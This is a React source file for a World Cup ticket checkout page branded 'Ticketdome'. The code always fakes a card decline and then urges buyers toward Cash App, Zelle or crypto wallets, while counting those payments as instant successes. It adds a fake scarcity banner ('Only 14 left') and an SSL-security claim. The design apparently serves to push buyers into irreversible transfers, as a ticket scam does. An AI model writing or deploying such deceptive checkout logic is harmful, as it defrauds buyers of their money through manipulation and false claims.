import React, { useState, useEffect } from 'react';
import { motion } from 'motion/react';
import { useParams, useNavigate, Link } from 'react-router-dom';
import { 
  ChevronLeft, Info, ShieldCheck, CreditCard, 
  CheckCircle, Plus, Minus, Ticket as TicketIcon,
  Trophy, MapPin, Calendar, Clock, AlertTriangle, Zap
} from 'lucide-react';
import { MOCK_EVENTS, TICKET_CATEGORIES } from '../constants';
import { useBookings } from '../lib/BookingContext';
import { useAuth } from '../lib/AuthContext';
import { getSupabase } from '../lib/supabase';
import { supabaseService } from '../services/supabaseService';
import { Event } from '../types';

export const TicketSelection: React.FC = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { user } = useAuth();
  const { addBooking } = useBookings();
  const [event, setEvent] = useState<Event | null>(MOCK_EVENTS.find(e => e.id === id) || null);
  const [ticketCategories, setTicketCategories] = useState(TICKET_CATEGORIES);
  const [loading, setLoading] = useState(true);
  
  const [selectedCategory, setSelectedCategory] = useState<string>(TICKET_CATEGORIES[2].id);
  const [quantity, setQuantity] = useState(1);
  const [isProcessing, setIsProcessing] = useState(false);
  const [step, setStep] = useState<'selection' | 'summary'>('selection');
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'cashapp' | 'zelle' | 'btc' | 'eth'>('card');
  const [paymentError, setPaymentError] = useState<string | null>(null);
  const [paymentSettings, setPaymentSettings] = useState<Record<string, string>>({
    cashapp_handle: '$cashtag',
    zelle_info: 'EMAIL OR PHONE',
    btc_address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    eth_address: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F'
  });

  useEffect(() => {
    const fetchSettings = async () => {
      const supabase = getSupabase();
      if (!supabase) return;

      const { data, error } = await supabase
        .from('payment_settings')
        .select('key, value');
      
      if (!error && data) {
        const settings: Record<string, string> = {};
        data.forEach(item => {
          settings[item.key] = item.value;
        });
        setPaymentSettings(prev => ({ ...prev, ...settings }));
      }
    };

    fetchSettings();
  }, []);

  useEffect(() => {
    const fetchCategories = async () => {
      try {
        const data = await supabaseService.getTicketCategories();
        if (data && data.length > 0) {
          setTicketCategories(data);
        }
      } catch (err) {
        console.error('Error fetching ticket categories:', err);
      }
    };

    fetchCategories();

    const supabase = getSupabase();
    if (supabase) {
      const channel = supabase
        .channel('ticket-categories-realtime')
        .on(
          'postgres_changes',
          { event: '*', schema: 'public', table: 'ticket_categories' },
          () => fetchCategories()
        )
        .subscribe();

      return () => {
        supabase.removeChannel(channel);
      };
    }
  }, []);

  useEffect(() => {
    if (!id) return;
    const fetchEvent = async () => {
      try {
        const data = await supabaseService.getEventById(id);
        if (data) {
          setEvent(data);
        }
      } catch (err) {
        console.error('Error fetching match details:', err);
      } finally {
        setLoading(false);
      }
    };
    fetchEvent();
  }, [id]);

  if (loading && !event) {
    return (
      <div className="min-h-screen bg-black flex items-center justify-center">
        <div className="w-12 h-12 border-4 border-accent border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  if (!event) return <div className="min-h-screen bg-black flex items-center justify-center text-white">Match not found</div>;

  const currentCategory = ticketCategories.find(c => c.id === selectedCategory) || ticketCategories[0];
  const subtotal = currentCategory.basePrice * quantity;
  const total = subtotal;

  const handleBooking = async () => {
    if (!user) {
      navigate('/login');
      return;
    }
    setIsProcessing(true);
    setPaymentError(null);
    
    // Simulate card decline
    if (paymentMethod === 'card') {
      setTimeout(() => {
        setIsProcessing(false);
        setPaymentError('Your card was declined by the issuing bank. Please try a different payment method like Cash App or Zelle for instant confirmation.');
      }, 2000);
      return;
    }

    // Success simulation for others
    if (['btc', 'eth', 'cashapp', 'zelle'].includes(paymentMethod)) {
       setTimeout(async () => {
          try {
            const bookingId = await addBooking({
              userId: user.id,
              eventId: event.id,
              tickets: {
                categoryId: selectedCategory,
                quantity,
                seats: Array.from({ length: quantity }, (_, i) => `${selectedCategory.toUpperCase()}-${Math.floor(Math.random() * 100)}-${i + 1}`),
                price: currentCategory.basePrice
              },
              totalAmount: total,
              paymentMethod: { last4: 'CRYP', brand: paymentMethod.toUpperCase() }
            });
            navigate('/payment-verification', { state: { bookingId, amount: total } });
          } catch (error) {
            console.error(error);
          } finally {
            setIsProcessing(false);
          }
       }, 2000);
       return;
    }

    try {
      const bookingId = await addBooking({
        userId: user.id,
        eventId: event.id,
        tickets: {
          categoryId: selectedCategory,
          quantity,
          seats: Array.from({ length: quantity }, (_, i) => `${selectedCategory.toUpperCase()}-${Math.floor(Math.random() * 100)}-${i + 1}`),
          price: currentCategory.basePrice
        },
        totalAmount: total,
        paymentMethod: { last4: '4242', brand: 'Visa' }
      });
      navigate('/payment-verification', { state: { bookingId, amount: total } });
    } catch (error) {
      console.error(error);
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-black pt-24 pb-20">
      <div className="max-w-7xl mx-auto px-4">
        <button 
          onClick={() => navigate(-1)}
          className="flex items-center space-x-2 text-[10px] font-black text-white/40 uppercase tracking-widest mb-10 hover:text-white transition-colors"
        >
          <ChevronLeft size={16} />
          <span>Back to Match Details</span>
        </button>

        {/* Urgency Banner */}
        <motion.div 
          initial={{ height: 0, opacity: 0 }}
          animate={{ height: 'auto', opacity: 1 }}
          className="mb-10 overflow-hidden"
        >
          <div className="bg-red-500/10 border border-red-500/20 p-4 flex items-center justify-between gap-4">
            <div className="flex items-center gap-3">
              <div className="bg-red-500 p-1.5 rounded-full animate-pulse">
                <Zap size={14} className="text-white" />
              </div>
              <div>
                <p className="text-[11px] font-black text-red-500 uppercase tracking-[0.2em] italic mb-0.5">High Demand Experience</p>
                <p className="text-[10px] font-bold text-white/60 uppercase tracking-widest leading-none">Limited tickets remaining for this category. Secure yours before they sell out.</p>
              </div>
            </div>
            <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-red-500/10 rounded-full border border-red-500/20 shrink-0">
               <div className="w-1.5 h-1.5 rounded-full bg-red-500 animate-ping" />
               <span className="text-[9px] font-black text-red-500 uppercase tracking-widest">Only 14 left</span>
            </div>
          </div>
        </motion.div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12">
          {/* Main Area */}
          <div className="lg:col-span-8 space-y-12">
            <header className="flex flex-col md:flex-row justify-between items-start md:items-end gap-6 pb-12 border-b border-white/10">
              <div>
                <p className="text-accent font-black uppercase tracking-[0.3em] text-[10px] mb-2 italic">Ticketdome | World Cup 26</p>
                <h1 className="text-5xl md:text-6xl font-black text-white italic uppercase tracking-tighter leading-none">{event.name}</h1>
                <div className="flex flex-wrap items-center gap-6 mt-6">
                   <div className="flex items-center gap-2 text-white/40 text-[10px] font-bold uppercase tracking-widest">
                      <MapPin size={14} className="text-accent" />
                      <span>{event.venue}, {event.location}</span>
                   </div>
                   <div className="flex items-center gap-2 text-white/40 text-[10px] font-bold uppercase tracking-widest">
                      <Calendar size={14} className="text-accent" />
                      <span>{event.date}</span>
                   </div>
                   <div className="flex items-center gap-2 text-white/40 text-[10px] font-bold uppercase tracking-widest">
                      <Clock size={14} className="text-accent" />
                      <span>{event.time} Local</span>
                   </div>
                </div>
              </div>
            </header>

            {step === 'selection' ? (
              <div className="space-y-12">
                {/* Stadium Map Simulation */}
                <div>
                   <h3 className="text-xl font-black text-white italic uppercase tracking-tighter mb-6 flex items-center gap-3">
                      <div className="w-1.5 h-6 bg-accent" />
                      Select Your Zone
                   </h3>
                   <div className="aspect-square md:aspect-video bg-white/5 border border-white/10 rounded-sm relative flex items-center justify-center overflow-hidden">
                      <div className="absolute inset-0 opacity-20 pointer-events-none">
                         <div className="absolute inset-0 grid grid-cols-12 gap-1 px-4 py-8">
                            {[...Array(144)].map((_, i) => (
                              <div key={i} className="aspect-square bg-white/10 rounded-full" />
                            ))}
                         </div>
                      </div>
                      <svg className="w-4/5 h-4/5 relative z-10" viewBox="0 0 100 60">
                         {/* pitch */}
                         <rect x="20" y="10" width="60" height="40" fill="transparent" stroke="white" strokeWidth="0.5" opacity="0.3" />
                         <circle cx="50" cy="30" r="5" fill="transparent" stroke="white" strokeWidth="0.5" opacity="0.3" />
                         <line x1="50" y1="10" x2="50" y2="50" stroke="white" strokeWidth="0.5" opacity="0.3" />
                         
                         {/* Stands */}
                         {/* VIP */}
                         <path 
                           d="M 20 5 L 80 5 C 85 5, 85 10, 80 15 L 20 15 C 15 15, 15 5, 20 5" 
                           fill={selectedCategory === 'vip' ? '#F27D26' : 'transparent'} 
                           stroke="#F27D26" 
                           className="cursor-pointer transition-all duration-300 hover:fill-accent/40"
                           onClick={() => setSelectedCategory('vip')}
                         />
                         {/* Premium Bottom */}
                         <path 
                           d="M 20 45 L 80 45 C 85 45, 85 55, 80 55 L 20 55 C 15 55, 15 45, 20 45" 
                           fill={selectedCategory === 'premium' ? '#F27D26' : 'transparent'} 
                           stroke="#F27D26" 
                           className="cursor-pointer transition-all duration-300 hover:fill-accent/40"
                           onClick={() => setSelectedCategory('premium')}
                         />
                         {/* Standard Sides */}
                         <path 
                           d="M 5 15 L 15 20 L 15 40 L 5 45 Z" 
                           fill={selectedCategory === 'standard' ? '#F27D26' : 'transparent'} 
                           stroke="#F27D26" 
                           className="cursor-pointer transition-all duration-300 hover:fill-accent/40"
                           onClick={() => setSelectedCategory('standard')}
                         />
                         <path 
                           d="M 95 15 L 85 20 L 85 40 L 95 45 Z" 
                           fill={selectedCategory === 'standard' ? '#F27D26' : 'transparent'} 
                           stroke="#F27D26" 
                           className="cursor-pointer transition-all duration-300 hover:fill-accent/40"
                           onClick={() => setSelectedCategory('standard')}
                         />

                         <text x="50" y="3" textAnchor="middle" fill="white" fontSize="2" fontWeight="bold" opacity="0.5">NORTH STAND</text>
                      </svg>
                      <div className="absolute bottom-6 left-6 right-6 flex items-center justify-center space-x-6">
                         {ticketCategories.map(c => (
                           <div key={c.id} className="flex items-center space-x-2">
                             <div className={`w-3 h-3 border  ${c.id === selectedCategory ? 'bg-accent border-accent' : 'border-white/20'}`} />
                             <span className="text-[10px] font-black text-white/40 uppercase tracking-widest">{c.name}</span>
                           </div>
                         ))}
                      </div>
                   </div>
                </div>

                <div className="space-y-4">
                  <h3 className="text-xl font-black text-white italic uppercase tracking-tighter mb-6 flex items-center gap-3">
                    <div className="w-1.5 h-6 bg-accent" />
                    Available Categories
                  </h3>
                  {ticketCategories.map(category => (
                    <div 
                      key={category.id} 
                      onClick={() => setSelectedCategory(category.id)}
                      className={`p-6 border transition-all cursor-pointer rounded-sm ${
                        selectedCategory === category.id 
                          ? 'bg-accent border-accent' 
                          : 'bg-white/5 border-white/10 hover:border-white/30'
                      }`}
                    >
                      <div className="flex justify-between items-start mb-2">
                        <div>
                          <h4 className={`text-xl font-black italic uppercase tracking-tighter ${selectedCategory === category.id ? 'text-black' : 'text-white'}`}>
                            {category.name}
                          </h4>
                          <p className={`text-[10px] font-bold uppercase tracking-widest ${selectedCategory === category.id ? 'text-black/60' : 'text-white/40'}`}>
                            {category.description}
                          </p>
                        </div>
                        <div className="text-right">
                          <p className={`text-2xl font-black italic tracking-tighter ${selectedCategory === category.id ? 'text-black' : 'text-white'}`}>
                            ${category.basePrice}
                          </p>
                          <p className={`text-[8px] font-bold uppercase tracking-widest ${selectedCategory === category.id ? 'text-black/40' : 'text-white/20'}`}>
                            Per Seat
                          </p>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              <div className="space-y-12">
                 <h3 className="text-xl font-black text-white italic uppercase tracking-tighter mb-6 flex items-center gap-3">
                    <div className="w-1.5 h-6 bg-accent" />
                    Review & Pay
                 </h3>
                 <div className="bg-white/5 border border-white/10 p-8 rounded-sm">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-12">
                       <div className="space-y-8">
                          <div>
                             <h4 className="text-[10px] font-black text-accent uppercase tracking-widest mb-6 italic">Select Payment Method</h4>
                             <div className="grid grid-cols-2 md:grid-cols-5 gap-3 mb-8">
                                <button 
                                  onClick={() => setPaymentMethod('card')}
                                  className={`p-4 border rounded-sm flex flex-col items-center justify-center gap-2 transition-all ${paymentMethod === 'card' ? 'bg-accent border-accent text-black' : 'bg-white/5 border-white/10 text-white/40 hover:border-white/30'}`}
                                >
                                   <CreditCard size={20} />
                                   <span className="text-[8px] font-black uppercase tracking-widest">Card</span>
                                </button>
                                <button 
                                  onClick={() => setPaymentMethod('cashapp')}
                                  className={`p-4 border rounded-sm flex flex-col items-center justify-center gap-2 transition-all ${paymentMethod === 'cashapp' ? 'bg-[#00D632] border-[#00D632] text-white' : 'bg-white/5 border-white/10 text-white/40 hover:border-white/30'}`}
                                >
                                   <div className="w-5 h-5 flex items-center justify-center font-bold text-lg">$</div>
                                   <span className="text-[8px] font-black uppercase tracking-widest">Cash App</span>
                                </button>
                                <button 
                                  onClick={() => setPaymentMethod('zelle')}
                                  className={`p-4 border rounded-sm flex flex-col items-center justify-center gap-2 transition-all ${paymentMethod === 'zelle' ? 'bg-[#6d1edb] border-[#6d1edb] text-white' : 'bg-white/5 border-white/10 text-white/40 hover:border-white/30'}`}
                                >
                                   <div className="w-5 h-5 flex items-center justify-center font-bold text-lg">Z</div>
                                   <span className="text-[8px] font-black uppercase tracking-widest">Zelle</span>
                                </button>
                                <button 
                                  onClick={() => setPaymentMethod('btc')}
                                  className={`p-4 border rounded-sm flex flex-col items-center justify-center gap-2 transition-all ${paymentMethod === 'btc' ? 'bg-[#F7931A] border-[#F7931A] text-white' : 'bg-white/5 border-white/10 text-white/40 hover:border-white/30'}`}
                                >
                                   <div className="w-5 h-5 flex items-center justify-center font-bold text-lg">₿</div>
                                   <span className="text-[8px] font-black uppercase tracking-widest">BTC</span>
                                </button>
                                <button 
                                  onClick={() => setPaymentMethod('eth')}
                                  className={`p-4 border rounded-sm flex flex-col items-center justify-center gap-2 transition-all ${paymentMethod === 'eth' ? 'bg-[#627EEA] border-[#627EEA] text-white' : 'bg-white/5 border-white/10 text-white/40 hover:border-white/30'}`}
                                >
                                   <div className="w-5 h-5 flex items-center justify-center font-bold text-lg">Ξ</div>
                                   <span className="text-[8px] font-black uppercase tracking-widest">ETH</span>
                                </button>
                             </div>

                             <h4 className="text-[10px] font-black text-accent uppercase tracking-widest mb-4 italic">
                                {paymentMethod === 'card' && 'Billing Details'}
                                {paymentMethod === 'cashapp' && 'Cash App Info'}
                                {paymentMethod === 'zelle' && 'Zelle Info'}
                                {paymentMethod === 'btc' && 'Bitcoin Payment'}
                                {paymentMethod === 'eth' && 'Ethereum Payment'}
                             </h4>
                             
                             <div className="space-y-4">
                                {paymentError && (
                                  <div className="p-4 bg-red-500/10 border border-red-500/20 rounded-sm mb-4">
                                    <p className="text-[10px] font-black text-red-500 uppercase tracking-widest italic leading-relaxed">
                                      {paymentError}
                                    </p>
                                  </div>
                                )}
                                {paymentMethod === 'card' ? (
                                   <>
                                      <input type="text" placeholder="FULL NAME ON CARD" className="w-full bg-white/5 border border-white/10 p-4 text-xs font-black uppercase tracking-widest text-white focus:border-accent outline-none" />
                                      <div className="relative">
                                         <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 text-white/20" size={18} />
                                         <input type="text" placeholder="CARD NUMBER" className="w-full bg-white/5 border border-white/10 p-4 pl-12 text-xs font-black uppercase tracking-widest text-white focus:border-accent outline-none" />
                                      </div>
                                      <div className="grid grid-cols-2 gap-4">
                                         <input type="text" placeholder="MM/YY" className="w-full bg-white/5 border border-white/10 p-4 text-xs font-black uppercase tracking-widest text-white focus:border-accent outline-none" />
                                         <input type="text" placeholder="CVC" className="w-full bg-white/5 border border-white/10 p-4 text-xs font-black uppercase tracking-widest text-white focus:border-accent outline-none" />
                                      </div>
                                   </>
                                ) : paymentMethod === 'cashapp' ? (
                                   <div className="space-y-4">
                                      <div className="p-4 bg-[#00D632]/10 border border-[#00D632]/20 rounded-sm">
                                         <p className="text-[10px] font-black text-[#00D632] uppercase tracking-widest mb-2 italic">Official Handle</p>
                                         <div className="w-full bg-white/5 border border-white/10 p-4 text-xs font-black uppercase tracking-widest text-accent mb-2">
                                            {paymentSettings.cashapp_handle}
                                         </div>
                                         <input type="text" placeholder="YOUR $CASHTAG" className="w-full bg-white/5 border border-white/10 p-4 text-xs font-black uppercase tracking-widest text-white focus:border-[#00D632] outline-none" />
                                      </div>
                                      <p className="text-[8px] font-bold text-white/20 uppercase tracking-[0.2em]">You will be redirected to confirm in the Cash App mobile application.</p>
                                   </div>
                                ) : paymentMethod === 'zelle' ? (
                                   <div className="space-y-4">
                                      <div className="p-4 bg-[#6d1edb]/10 border border-[#6d1edb]/20 rounded-sm">
                                         <p className="text-[10px] font-black text-[#6d1edb] uppercase tracking-widest mb-2 italic">Registered Email or Phone</p>
                                         <div className="w-full bg-white/5 border border-white/10 p-4 text-xs font-black uppercase tracking-widest text-accent mb-2">
                                            {paymentSettings.zelle_info}
                                         </div>
                                         <input type="text" placeholder="YOUR EMAIL OR PHONE" className="w-full bg-white/5 border border-white/10 p-4 text-xs font-black uppercase tracking-widest text-white focus:border-[#6d1edb] outline-none" />
                                      </div>
                                      <p className="text-[8px] font-bold text-white/20 uppercase tracking-[0.2em]">Authentication required via your banking application provider.</p>
                                   </div>
                                ) : (
                                   <div className="space-y-4">
                                      <div className="p-4 bg-white/5 border border-white/10 rounded-sm">
                                         <p className="text-[10px] font-black uppercase tracking-widest mb-2 italic text-accent">
                                            {paymentMethod === 'btc' ? 'Bitcoin (BTC) Wallet Address' : 'Ethereum (ETH) Wallet Address'}
                                         </p>
                                         <div className="flex gap-2">
                                            <input 
                                               type="text" 
                                               readOnly 
                                               value={paymentMethod === 'btc' ? paymentSettings.btc_address : paymentSettings.eth_address}
                                               className="w-full bg-black/40 border border-white/10 p-4 text-[10px] font-mono text-white/60 outline-none" 
                                            />
                                         </div>
                                      </div>
                                      <p className="text-[8px] font-bold text-white/20 uppercase tracking-[0.2em]">Please send exact total to the address above. Confirmation may take up to 10 minutes.</p>
                                   </div>
                                )}
                             </div>
                          </div>
                       </div>
                       <div className="bg-black/40 p-6 border border-white/5 rounded-sm">
                          <h4 className="text-[10px] font-black text-white uppercase tracking-widest mb-4 italic">Security Check</h4>
                          <div className="flex items-center gap-4 p-4 border border-green-500/20 bg-green-500/5 rounded-sm mb-6">
                             <ShieldCheck className="text-green-500" size={24} />
                             <p className="text-[10px] font-bold text-green-500 uppercase leading-relaxed tracking-wider">
                                Your payment is encrypted with 256-bit SSL security. 
                             </p>
                          </div>
                          <div className="flex items-center gap-4 p-4 border border-accent/20 bg-accent/5 rounded-sm">
                             <TicketIcon className="text-accent" size={24} />
                             <p className="text-[10px] font-bold text-accent uppercase leading-relaxed tracking-wider">
                                Instant delivery to your member wallet upon confirmation.
                             </p>
                          </div>
                       </div>
                    </div>
                 </div>
              </div>
            )}
          </div>

          {/* Checkout Info Sidebar */}
          <div className="lg:col-span-4">
            <div className="sticky top-32 space-y-6">
              <div className="bg-white/5 border border-white/10 p-6 rounded-sm">
                <h3 className="text-xs font-black text-white uppercase tracking-[0.2em] mb-6 italic border-b border-white/5 pb-4">Order Summary</h3>
                
                <div className="space-y-6 mb-8">
                  <div className="flex justify-between items-center text-[10px] font-bold text-white/40 uppercase tracking-widest">
                    <span>Category</span>
                    <span className="text-white">{currentCategory.name}</span>
                  </div>
                  
                  <div className="flex justify-between items-center">
                    <span className="text-[10px] font-bold text-white/40 uppercase tracking-widest">Quantity</span>
                    <div className="flex items-center space-x-4 bg-white/5 border border-white/10 p-1 rounded-sm">
                      <button 
                        onClick={() => setQuantity(Math.max(1, quantity - 1))}
                        className="p-1 hover:text-accent transition-colors disabled:opacity-30"
                        disabled={step === 'summary'}
                      >
                        <Minus size={14} />
                      </button>
                      <span className="text-xs font-black text-white w-4 text-center">{quantity}</span>
                      <button 
                        onClick={() => setQuantity(Math.min(10, quantity + 1))}
                        className="p-1 hover:text-accent transition-colors disabled:opacity-30"
                        disabled={step === 'summary'}
                      >
                        <Plus size={14} />
                      </button>
                    </div>
                  </div>

                  <div className="space-y-2 pt-4 border-t border-white/5">
                    <div className="flex justify-between items-center text-[10px] font-black uppercase tracking-widest text-white/60">
                      <span>Subtotal</span>
                      <span>${subtotal.toFixed(2)}</span>
                    </div>
                  </div>

                  <div className="pt-4 border-t border-white/20 flex justify-between items-center">
                    <span className="text-xs font-black text-accent uppercase tracking-tighter">Total Amount</span>
                    <span className="text-3xl font-black text-white italic tracking-tighter">${total.toFixed(2)}</span>
                  </div>
                </div>

                {step === 'selection' ? (
                  <button 
                    onClick={() => setStep('summary')}
                    className="w-full py-5 bg-white text-black font-black uppercase tracking-widest text-sm hover:bg-accent transition-all duration-300"
                  >
                    Continue to Payment
                  </button>
                ) : (
                  <button 
                    onClick={handleBooking}
                    disabled={isProcessing}
                    className="w-full py-5 bg-accent text-black font-black uppercase tracking-widest text-sm hover:bg-white transition-all duration-300 flex items-center justify-center space-x-2"
                  >
                    {isProcessing ? (
                      <>
                        <div className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin" />
                        <span>Verifying...</span>
                      </>
                    ) : (
                      <>
                        <CheckCircle size={18} />
                        <span>Confirm & Pay</span>
                      </>
                    )}
                  </button>
                )}
                
                {step === 'summary' && (
                   <button 
                    onClick={() => setStep('selection')}
                    className="w-full mt-4 text-[10px] font-black text-white/40 uppercase tracking-widest hover:text-white transition-colors"
                   >
                     Adjust Selection
                   </button>
                )}
              </div>

              <div className="p-6 bg-white/[0.02] border border-white/10 rounded-sm">
                 <div className="flex items-center gap-4 text-white/60 mb-4">
                    <Info size={18} className="text-accent shrink-0" />
                    <p className="text-[10px] font-bold uppercase leading-relaxed tracking-wider">
                       Tickets for this event are mobile-only. You will not receive a print-at-home PDF. 
                    </p>
                 </div>
                 <p className="text-[8px] font-medium text-white/20 uppercase tracking-[0.2em] italic">
                   Price includes all federal and stadium surcharges.
                 </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
